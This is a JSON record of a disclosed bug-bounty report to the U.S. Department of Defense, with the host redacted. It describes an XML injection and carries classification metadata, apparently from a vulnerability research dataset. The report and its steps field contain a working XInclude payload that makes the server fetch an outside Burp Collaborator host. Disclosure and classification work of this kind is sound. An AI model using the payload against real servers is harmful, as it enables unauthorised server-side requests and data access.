{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "fiveguyslover ",
  "title": "XML Injection on https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (\u2588\u2588\u2588 parameter)",
  "content": "\nGreetings,\nI found an XML injection on https://www.\u2588\u2588\u2588.\nThis kind of vulnerability can be difficult to detect and exploit remotely; you should review the application's response\nhere is the complete link: https://www.\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nPayload :\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588=<vuc xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo\"/></vuc>\nResult :\n\u2588\u2588\u2588\nbest regards,\nfrenchvlad\nImpact\ngaining the access to the unauthorized parts and stealing the sensitive data would be the most important thing to know when it comes to XML\u2019s impact.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "XML Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1617403380,
  "report_url": "https://hackerone.com/reports/997381",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to the vulnerable URL: https://www.\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
    ],
    [
      2,
      "Inject the XML payload into the vulnerable parameter (\u2588\u2588\u2588 parameter): \u2588\u2588\u2588\u2588\u2588\u2588\u2588=<vuc xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://9bligh4snzlirzuxt4lbu3zullrbf0.burpcollaborator.net/foo\"/></vuc>"
    ]
  ],
  "vuln_description": "XML Injection vulnerability allows an attacker to inject malicious XML content into a vulnerable parameter, potentially leading to unauthorized data access or server-side request forgery (SSRF). The vulnerability was demonstrated by including an external XML entity that triggered a callback to a Burp Collaborator server.",
  "reason": "The attack involves a straightforward injection of XML content into a parameter, without requiring multiple components, complex state manipulation, or novel logic. The vulnerability is detected by observing the application's response to the injected payload.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "reasoning": "The XML injection vulnerability described in the report leverages an XInclude payload pointing to an external Burp Collaborator URL, which relies on out-of-band (OOB) detection. The methodology's 'Simple Payloads' criteria explicitly require payload execution detection within the *same channel* (e.g., via HTTP response inspection or regular navigation). Since OOB detection is not part of the same channel and requires external interaction monitoring, this vulnerability would not be detected using the described methodology's constraints. The payload also does not meet the 'simple' criteria as XInclude exploitation typically requires awareness of XML parsing behavior and external entity inclusion, which may not be included in generic payload lists.",
    "is_simple_injection": false
  },
  "authnz_metadata": {
    "reason": "The XML injection vulnerability involves manipulating XML input to include external entities, which is a different class of vulnerability from IDOR or AuthN/AuthZ bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, not on testing input validation for XML parsing.",
    "is_detectable": false
  }
}